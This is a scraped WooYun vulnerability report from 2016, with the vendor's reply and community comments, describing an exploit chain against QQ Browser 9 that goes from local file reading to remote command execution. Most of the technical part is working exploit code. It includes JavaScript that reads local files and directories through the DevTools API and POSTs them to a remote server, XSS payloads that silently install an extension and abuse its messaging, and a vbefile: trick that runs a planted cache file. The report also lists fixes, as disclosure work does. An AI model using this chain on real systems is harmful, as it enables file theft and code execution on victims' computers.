{"id": 86811, "wybug_id": "wooyun-2016-0176314", "wybug_title": "QQ浏览器9本地文件读取&amp;远程命令执行", "wybug_corp": "腾讯", "wybug_author": "gainover", "wybug_date": "2016-02-17 08:56", "wybug_open_date": "2016-05-17 15:10", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-17：\t细节向公众公开  简要描述： 新年快乐 详细说明：  QQ浏览器最新版本，版本：9.3.6581.4001. 老外在一个avast的漏洞（https://**.**.**.**/p/chromium/codesearch#chromium/src/chrome/browser/devtools/devtools_ui_**.**.**.**&sq=package:chromium&type=cs&l=638）里提到了chrome-devtools的一个本地文件读取的漏洞（情报来自@sogili（长短短））拿老外的PoC来试试？QQ浏览器打开下面的URL：chrome-devtools://devtools/bundled/inspector.html?remoteBase=https://**.**.**.**/&remoteFrontend=true这个会加载一个外部的jshttps://**.**.**.**/screencast_module.jsscreencast_module.js 代码如下：\nvar data = \"\";DevToolsAPI.streamWrite = function(id, chunk) {    document.write(\"Receiving data for stream \" + id + \"<br>\");    data += chunk;}DevToolsAPI.sendMessageToEmbedder(    \"loadNetworkResource\",    [ \"file:///C:/111.txt\", \"\", 0 ],    function (result) {        var x=new XMLHttpRequest();x.open(\"POST\",\"https://**.**.**.**\",true);x.send(data);    });\n可以看到利用 DevToolsAPI，可以向外出容器发送消息，消息类型为 loadNetworkResource，通过这个，可以读取本地文件内容。如下图所示：\n\n不仅仅是读文件内容，利用这个，还可以读取目录下的文件列表，像这样\nvar data = \"\";DevToolsAPI.streamWrite = function(id, chunk) {    document.write(\"Receiving data for stream \" + id + \"<br>\");    data += chunk;}DevToolsAPI.sendMessageToEmbedder(    \"loadNetworkResource\",    [ \"file:///C:/\", \"\", 0 ],    function (result) {        var x=new XMLHttpRequest();x.open(\"POST\",\"https://**.**.**.**\",true);x.send(data);    });\n如下图所示：\n\n因此，只要让QQ浏览器打开这个页面，我们就可以遍历本地文件内容，并读取发送至远程服务器上。 2. 如何让QQ浏览器打开 chrome-devtools://devtools/bundled/inspector.html?remoteBase=https://**.**.**.**/&remoteFrontend=true 这个地址呢？常规的location.href，window.open应该是都不行的，会被安全限制。比如：提示Not allowed to load local resource，或打开页面是空白等措施。怎么破？这里直接先列出思路。\na. 子域.**.**.**.** XSS -> iframe -> 子域.browser.**.**.**.** （该页面的domain要求为**.**.**.**）b. 调用子域.browser.**.**.**.**里的chrome.management.install API 安装插件“手机助手”c. 插件安装成功后，利用子域.**.**.**.** XSS -> chrome.runtime.sendMessage 向“手机助手”发送消息， --> 手机助手接受消息 打开 chrome-devtools://devtools/bundled/inspector.html?remoteBase=https://**.**.**.**/&remoteFrontend=true\n3. 我们来一步一步实现上面的步骤,首先是一个子域的XSShttp://wiki.dev.4g.**.**.**.**/v2/ZH_CN/ios/index.html#!/%5c/**.**.**.**/test/all/qq-xss-alert.php\n\n4. 找到一个子域.browser.**.**.**.**，因为browser.**.**.**.**及其子域有使用chrome.management.install的权限。http://event.browser.**.**.**.**/stdl/miyue/index.html如下图所示：\n\n5. 用子域.**.**.**.**的XSS调用子域.browser.**.**.**.**的chrome.management.install实现插件安装，利用代码如下：qq-xss-install.php\n<?php\theader(\"Access-Control-Allow-Headers: x-requested-with\");\theader(\"Access-Control-Allow-Origin: *\");?><script>document.domain='**.**.**.**';var f=document.createElement(\"iframe\");f.src='http://event.browser.**.**.**.**/stdl/miyue/index.html';f.onload=function(){\tf.contentWindow.chrome.management.install({id:\"llilejmacjghpgeenjonaggofdjobdhb\",crx_url:\"https://pcbrowser.dd.**.**.**.**/pcbrowserbig/qbextension/qb_crx/85a4b89505532a5ec92faf546bbcda81.crx\"},function(){console.log(arguments)})}document.body.appendChild(f);</script>\n访问下面的地址：http://wiki.dev.4g.**.**.**.**/v2/ZH_CN/ios/index.html#!/%5c/**.**.**.**/test/all/qq-xss-install.php如下图所示，手机助手将会被安装。\n\n6. 在手机助手安装完成后，我们就可以使用chrome.runtime.sendMessage来发送消息，\nchrome.runtime.sendMessage(\"llilejmacjghpgeenjonaggofdjobdhb\",{cmd:'jump',isNewOpen:true,target:'chrome-devtools://devtools/bundled/inspector.html?remoteBase=https://**.**.**.**/&remoteFrontend=true'});\n修改步骤5里的代码，在安装完成的回调里添加以上代码。qq-xss-install-2.php\n<?php\theader(\"Access-Control-Allow-Headers: x-requested-with\");\theader(\"Access-Control-Allow-Origin: *\");?><script>document.domain='**.**.**.**';var f=document.createElement(\"iframe\");f.src='http://event.browser.**.**.**.**/stdl/miyue/index.html';f.onload=function(){\tf.contentWindow.chrome.management.install({id:\"llilejmacjghpgeenjonaggofdjobdhb\",crx_url:\"https://pcbrowser.dd.**.**.**.**/pcbrowserbig/qbextension/qb_crx/85a4b89505532a5ec92faf546bbcda81.crx\"},function(){\t\tconsole.log(arguments);\t\tsetTimeout(function(){\t\t\tchrome.runtime.sendMessage(\"llilejmacjghpgeenjonaggofdjobdhb\",{cmd:'jump',isNewOpen:true,target:'chrome-devtools://devtools/bundled/inspector.html?remoteBase=https://**.**.**.**/&remoteFrontend=true'});\t\t},2000);\t})}document.body.appendChild(f);</script>\n访问：http://wiki.dev.4g.**.**.**.**/v2/ZH_CN/ios/index.html#!/%5c/**.**.**.**/test/all/qq-xss-install-2.php等待插件被安装完成后，就会打开 chrome-devtools://devtools/bundled/inspector.html?remoteBase=https://**.**.**.**/&remoteFrontend=true如下图所示：\n\n7. 为啥向“手机助手”发送消息可以打开指定的页面？查看手机助手扩展里的message.js，里面存在如下代码：\nchrome.runtime.onMessageExternal.addListener(function(e,t,o){var a=t.tab.id;\"jump\"===e.cmd&&(e.isNewOpen?chrome.tabs.create({url:e.target}):chrome.tabs.update(a,{url:e.target}),o({error:0}))})\n在扩展里定义了onMessageExternal的listner，这使得插件可以接受外部扩展的消息。所以我们可以构造恶意的消息，发送给该扩展，从而打开我们指定的页面。---------------------------------------- ***  分割线，从文件读取到命令执行  ***  ----------------------------------------1. 首先还是列一下思路\na. 访问http://**.**.**.**/test/all/cache.php，让浏览器生成一个恶意的缓存文件b. 通过上面的文件读取，读取c:/users/下的用户名列表，找到当前用户的用户名c. 得到浏览器的缓存目录C:\\Users\\用户名\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default\\Cached. 通过上面的文件读取，得到缓存目录下的文件列表，得到浏览器刚生成的缓存文件名称e. 通过 location.href='vbefile:/../../../../../../../../../../Users/用户名/AppData/Local/Tencent/QQBrowser/User Data/Default/Cache/缓存文件名\" //E:jscript //B \"' 来执行恶意缓存文件\n2. 首先是获得c:/users/下的用户列表\nfunction getUsers(){\tDevToolsAPI.sendMessageToEmbedder(\t\t\"loadNetworkResource\",\t\t[ \"file:///C:/Users\", \"\", 0 ],\t\tfunction (result) {\t\t\tvar users=data.match(/<script>addRow\\(\"([^\"]+)\"/g)||[];\t\t\tvar currentUser=[];\t\t\tfor(var i=0;i<users.length;i++){\t\t\t\tvar user=(users[i].match(/<script>addRow\\(\"([^\"]+)\"/)||[\"\",\"\"])[1]\t\t\t\tif([\"..\",\"All Users\",\"Default\",\"Default User\",\"Public\",\"UpdatusUser\",\"desktop.ini\"].indexOf(user)==-1){\t\t\t\t\tcurrentUser.push(user); \t\t\t\t}\t\t\t\t\t\t\t}\t\t\tconsole.log(currentUser);\t\t}\t);}\n3. 然后是读取缓存文件列表\nfunction getCaches(User){\tDevToolsAPI.sendMessageToEmbedder(\t\t\"loadNetworkResource\",\t\t[ \"file:///C:/Users/\"+User+\"/AppData/Local/Tencent/QQBrowser/User Data/Default/Cache/\", \"\", 0 ],\t\tfunction (result) {\t\t\t//console.log(data);\t\t\tvar cachesData=data.match(/<script>addRow\\(\"([^\"]+)\"/g)||[];\t\t\tconsole.log(cachesData.length);\t\t\tvar caches=[];\t\t\tfor(var i=0;i<cachesData.length;i++){\t\t\t\tvar cache=(cachesData[i].match(/<script>addRow\\(\"([^\"]+)\"/)||[\"\",\"\"])[1]\t\t\t\tif(cache!=\"..\"){\t\t\t\t\tcaches.push(cache); \t\t\t\t}\t\t\t\t\t\t\t}\t\t\tconsole.log(caches);\t\t}\t);\t}\n4. 创建恶意缓存\nvar img=new Image();img.onerror=function(){     //缓存加载完毕的回调};img.src=\"http://**.**.**.**/test/all/cache.php?\"+Math.random();\n5. 然后是所有代码串起来。首先是得到用户名，这里假定只有一个用户，如果有多个用户，可以循环尝试每个用户。然后是得到缓存文件列表，然后创建恶意缓存，然后再得到一次缓存文件列表，对比2个列表，就可以得到缓存文件名。然后执行缓存文件名。\n测试代码见测试代码区域\n效果如下，可以看到得到的缓存文件名，然后缓存被执行。\n\n   漏洞证明：  win7访问 漏洞测试页（见测试代码里的地址）会跳转至 **.**.**.**加载 http://**.**.**.**/stdl/miyue/index.html安装“手机助手”扩展， 这个可能需要下载一小会并自动安装，安装成功后，就会打开chrome-devtools://devtools/ 下的页面进而执行“详细说明”里的流程\n\n   修复方案：  1. 浏览器调用外部协议时，增加用户交互提示，见  http://**.**.**.**/test/all/readme.htm2. 手机助手扩展里的，接受消息后，对需要打开的url进行判断。3. 修复 **.**.**.** XSS4. 降低chrome.management.install的作用范围。5. 更新chrome-devtools（我也不知道有没有更新补丁，或者自行更改devtools里的相关JS代码）   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2016-02-17 15:02 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-17 08:57 |    \t\t艺术家 \t\t\t( 普通白帽子  |\t\t\t        Rank:496 漏洞数:102        | 我觉得我像个艺术家。)\t\t \n  哈哈，我是第一人    \n     2016-02-17 08:58 |    \t\t剑芯 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:15        | xsser)\t\t \n  哈哈，我是第二人    \n     2016-02-17 09:00 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1393 漏洞数:147        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  哈哈，我是第三人    \n     2016-02-17 09:01 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:810 漏洞数:127        | ®高级安全工程师 | WooYun认证√)\t\t \n  呜呜，我是第三人    \n     2016-02-17 09:04 |    \t\tk0_pwn \t\t\t( 普通白帽子  |\t\t\t        Rank:149 漏洞数:15        | 专注且自由)\t\t \n  嘻嘻，我是第四人    \n     2016-02-17 09:04 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:31        | 是金子总会发光，在还未发光之前，先磨磨)\t\t \n  呜呜，我是第四人    \n     2016-02-17 09:08 |    \t\t’‘Nome \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:31        | 有事请发邮件，2859857@gmail.com，垃圾邮...)\t\t \n  嘎嘎，我是第五人    \n     2016-02-17 09:24 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  我是第99人    \n     2016-02-17 09:24 |    \t\twinalva \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:11        | rank是什么？)\t\t \n  啦啦，对不起，我是第六人    \n     2016-02-17 09:27 |    \t\tciba \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:14        | 无名小卒)\t\t \n  荣登top ten    \n     2016-02-17 09:32 |    \t\t路人毛 \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:44        | 要想Rank给高，标题一定得屌)\t\t \n  大声告诉我，我是第几人？    \n     2016-02-17 09:48 |    \t\tSai、 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | for fun……)\t\t \n  据PKAV的伙伴说上班总是上着上着就被二哥黑了    \n     2016-02-17 10:32 |    \t\tj14n \t\t\t( 普通白帽子  |\t\t\t        Rank:1731 漏洞数:319        | ... . -.-.   - . .- --)\t\t \n  top 15    \n     2016-02-17 10:37 |    \t\tkotobuki \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:7        | 烧饭大帅哥!!)\t\t \n  火钳刘明    \n     2016-02-17 11:25 |    \t\thkcs \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 只是路过)\t\t \n  关注百度安全    \n     2016-02-17 11:26 |    \t\thkcs \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 只是路过)\t\t \n  @hkcs 你怎么回复的。。笑了，是腾讯安全    \n     2016-02-17 11:36 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  @Sai、 我可以证明这是真的    \n     2016-02-17 11:43 |    \t\t梦皑皑 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 本人小白，缺团队培养。)\t\t \n  留个名，好看看    \n     2016-02-17 12:46 |    \t\tBurn Egg \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:10        | 经验，范围，字典，思维)\t\t \n  二哥就是二哥，，学不来啊    \n     2016-02-17 13:10 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:4829 漏洞数:368        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  厉害，一套一套的    \n     2016-02-17 13:55 |    \t\t陆由乙 \t\t\t( 普通白帽子  |\t\t\t        Rank:562 漏洞数:128        | 我是突突兔！)\t\t \n      \n     2016-02-17 14:20 |    \t\tSoulmk \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:14        | 低调学习求发展~)\t\t \n      \n     2016-02-17 15:20 |    \t\t过来人 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我是小白！啦啦啦！)\t\t \n  我是第23人！啦啦啦！    \n     2016-02-17 15:34 |    \t\terhuo \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:36        | 666)\t\t \n  嘿嘿，我是第二十四人     \n     2016-02-17 15:50 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  被黑的在此！    \n     2016-02-21 23:02 |    \t\tzeracker  \t\t\t( 普通白帽子  |\t\t\t        Rank:1077 漏洞数:139        | 爱吃小龙虾。)\t\t \n  nb。    \n     2016-02-28 13:27 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:162 漏洞数:65        | 我要是再正常一点就好了)\t\t \n  #27    \n     2016-02-29 19:14 |    \t\t玄道 \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:41        | 就是注入 就是注入 注入)\t\t \n  二八楼嘎嘎    \n     2016-03-03 11:46 |    \t\t你大爷在此 百无禁忌 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:9        | 迎风尿三丈 顺风八十米)\t\t \n  二哥 666    \n     2016-03-05 11:46 |    \t\t伤剑 \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:39        | 冷瞳冷心冷少年，冷淡冷漠冷温柔。)\t\t \n  我是第几人    \n     2016-03-18 09:07 |    \t\t杨聪 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 新手上路，多多照顾，)\t\t \n  三一任 吼吼    \n     2016-03-18 10:38 |    \t\t习总夸我好青年 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 刚来的,请多关照)\t\t \n  等着呢 ! 混脸熟    \n     2016-03-25 08:14 |    \t\t江西高创安邦技术有限公司(乌云厂商)\t\t \n  @猪猪侠 你好，可以留个联系方式吗？    \n     2016-04-12 15:13 |    \t\t淡茶de清香 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 收集)\t\t \n  等着呢 ! 混脸熟    \n     2016-05-01 00:18 |    \t\tArcheb \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | 学生，乌云路人一枚。)\t\t \n  我是第35人吧    \n     2016-05-02 18:45 |    \t\t伤剑 \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:39        | 冷瞳冷心冷少年，冷淡冷漠冷温柔。)\t\t \n  6666666666666666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}